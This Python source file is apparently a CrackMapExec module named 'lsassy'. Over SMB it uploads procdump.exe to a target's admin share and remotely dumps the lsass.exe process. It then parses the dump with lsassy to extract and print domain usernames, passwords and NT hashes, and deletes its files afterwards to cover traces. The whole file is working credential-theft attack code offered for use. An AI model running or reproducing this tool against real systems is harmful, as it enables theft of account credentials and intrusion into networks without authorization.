# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com
 
import os
import sys
import re
import time
import subprocess

class CMEModule:

    name = 'lsassy'
    description = "Dump lsass via procdump and parse the result remotely with lsassy"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            SHARE               Share to upload procdump and dump lsass (default: C$)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
        '''

        self.tmp_dir = "\\Windows\\Temp\\"
        self.share = "C$"
        self.procdump = "procdump.exe"
        self.procdump_path = "/tmp/"


        if 'TMP_DIR' in module_options:
            self.tmp_dir = module_options['TMP_DIR']
        
        if 'SHARE' in module_options:
            self.share = module_options['SHARE']

        if 'PROCDUMP_PATH' in module_options:
            self.procdump_path = module_options['PROCDUMP_PATH']

        if 'PROCDUMP_EXE_NAME' in module_options:
            self.procdump = module_options['PROCDUMP_EXE_NAME']


    def on_admin_login(self, context, connection):
        # Verify procdump exists on host
        procdump_full_path = os.path.join(self.procdump_path, self.procdump)
        if not os.path.exists(self.procdump_path):
            context.log.error("{} directory does not exist.".format(self.procdump_path))
            return 1
        elif not os.path.exists(procdump_full_path):
            context.log.error("{} does not exist.".format(procdump_full_path))
            return 1

        # Upload procdump
        context.log.debug('Copy {} to {}'.format(procdump_full_path, self.tmp_dir))
        with open(procdump_full_path, 'rb') as procdump:
            try:
                connection.conn.putFile(self.share, self.tmp_dir + self.procdump, procdump.read)
                context.log.debug('Created file {} on the \\\\{}{}'.format(self.procdump, self.share, self.tmp_dir))
            except Exception as e:
              context.log.error('Error writing file to share {}: {}'.format(self.share, e))
    
        
        # Dump lsass remotely
        dumped = False        
        while not dumped:
            # Dump using lsass PID
            command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp""".format(self.tmp_dir, self.procdump, self.tmp_dir)
            context.log.debug('Dumping lsass.exe')
            p = connection.execute(command, True)
            context.log.debug(p)
            output = 0

            if 'Dump 1 complete' in p:
                # Procdump ended
                context.log.debug('Procdump output fully retrieved')
                output = 2
            elif 'Dump 1 initiated' in p:
                # Procdump output not fully retrieved
                context.log.debug('Procdump output partially retrieved')
                # Since we cannot know when the dump finishes, we wait for 2s
                time.sleep(2)
                output = 1
            elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
                context.log.error('Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)')
            else:
                context.log.error('Process lsass.exe error on dump, try with --verbose to see details')
            
            if output > 0:
                # Full or partial output, looking for dumpfile
                regex = r"([A-Za-z0-9-]*.dmp)"
                matches = re.search(regex, str(p), re.MULTILINE)
                machine_name = ''
                if matches:
                    machine_name = matches.group()
                    dumped = True
                    if output == 1:
                        context.log.debug('Procdump output successfully parsed')
                else:
                    context.log.debug("Error getting the lsass dump file name. Trying again")
            else:
                context.log.error("Error dumping lsass")
                return 1
        
        context.log.success("Process lsass.exe was successfully dumped")

        """
        Since lsassy is py3.6+ and CME is still py2, lsassy cannot be
        imported. For this reason, connection information must be sent to lsassy
        so it can create a new connection.

        When CME is py3.6 compatible, CME connection object will be reused.
        """
        domainName = connection.domain
        userName = connection.username
        password = connection.password if connection.password is not None else connection.nthash
        host = connection.host
        
        py_arg = "{}/{}:{}@{}:/{}{}".format(
                    domainName, userName, password, host, self.share, os.path.join(self.tmp_dir, machine_name)
                ).replace("\\", "/")
        
        command = r"lsassy {}".format(py_arg, self.procdump_path + machine_name)
        
        # Parsing lsass dump remotely
        context.log.info('Parsing dump file with lsassy')
        code, out, err = self.run(command)

        if code != 0:
            # Debug output
            context.log.error('Error while execute lsassy, try with --verbose to see details')
            context.log.debug('Detailed error : {}'.format(err))
            return code

        credentials = self.parse_output(out)
        for credential in credentials:
            context.log.highlight("%s\\%s:%s" % credential)
        
        # Delete lsass dump
        try:
            connection.conn.deleteFile(self.share, self.tmp_dir + machine_name)
            context.log.success('Deleted lsass dump')
        except Exception as e:
            context.log.error('Error deleting lsass dump : {}'.format(e))
        
        # Delete procdump.exe
        try:
            connection.conn.deleteFile(self.share, self.tmp_dir + self.procdump)
            context.log.success('Deleted procdump.exe')
        except Exception as e:
            context.log.error('Error deleting procdump.exe : {}'.format(e))
            
    
    def parse_output(self, output):
        regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
        matches = re.finditer(regex, output, re.MULTILINE | re.IGNORECASE)
        credentials= []
        for match in matches:
            domain = match.group("domain")
            username = match.group("username")
            password = match.group("password") or match.group("hash")
            credentials.append((domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8')))
        return set(credentials)

    def run(self, cmd):
        proc = subprocess.Popen(['/bin/sh', '-c', cmd],
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
        )
        stdout, stderr = proc.communicate()
     
        return proc.returncode, stdout, stderr
